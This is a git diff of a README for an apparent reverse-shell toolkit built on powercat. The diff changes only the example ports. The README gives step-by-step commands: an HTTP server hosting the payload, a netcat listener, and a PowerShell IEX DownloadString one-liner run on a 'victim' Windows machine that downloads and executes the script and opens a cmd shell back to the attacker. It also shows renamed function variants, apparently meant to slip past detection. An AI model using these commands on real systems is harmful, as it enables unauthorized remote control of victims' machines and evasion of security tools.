@@ -15,22 +15,22 @@ git clone https://github.com/rexpository/reverseshell-powercat-v2.git
 cd reverseshell-powercat-v2
 ```
 
-Start a Python HTTP server on a port of your choice (e.g., 80) for the victim to access the script
+Start a Python HTTP server on a port of your choice (e.g., 70) for the victim to access the script
 ```
-python -m SimpleHTTPServer 80
+python -m SimpleHTTPServer 70
 ```
 
-Start a Netcat listener on a port of your choice (e.g., 4444) for obtaining a reverse connection
+Start a Netcat listener on a port of your choice (e.g., 5555) for obtaining a reverse connection
 ```
 sudo apt-get install netcat
-nc -lp 4444
+nc -lp 5555
 ```
 
 On your Windows victim machine, run the following Powershell command inside the command prompt (CMD). 
 ```
-powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://YOURIP:80/powercat.ps1');powerrcatt -c YOURIP -p 4444 -e cmd"
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://YOURIP:70/powercat.ps1');powerrcatt -c YOURIP -p 5555 -e cmd"
 ```
-Note: YOURIP should be your host's local IP address (Linux IP address); make sure to replace ports 80 and 4444 in the command with your own configurations.
+Note: YOURIP should be your host's local IP address (Linux IP address); make sure to replace ports 70 and 5555 in the command with your own configurations.
 
 You will obtain a reverse shell in the Netcat listener once the command is executed. To check what account type you're logged into, use the command *whoami*. 
 
@@ -64,11 +64,11 @@ Make sure that you update the powershell command from earlier to reflect these c
 
 Original command:
 ```
-powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://YOURIP:80/powercat.ps1');powerrcatt -c YOURIP -p 4444 -e cmd"
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://YOURIP:70/powercat.ps1');powerrcatt -c YOURIP -p 5555 -e cmd"
 ```
 Updated command:
 ```
-powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://YOURIP:80/powercat.ps1');powerrrrcat -c YOURIP -p 4444 -e cmd"
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://YOURIP:70/powercat.ps1');powerrrrcat -c YOURIP -p 5555 -e cmd"
 ```
 
 # Credits
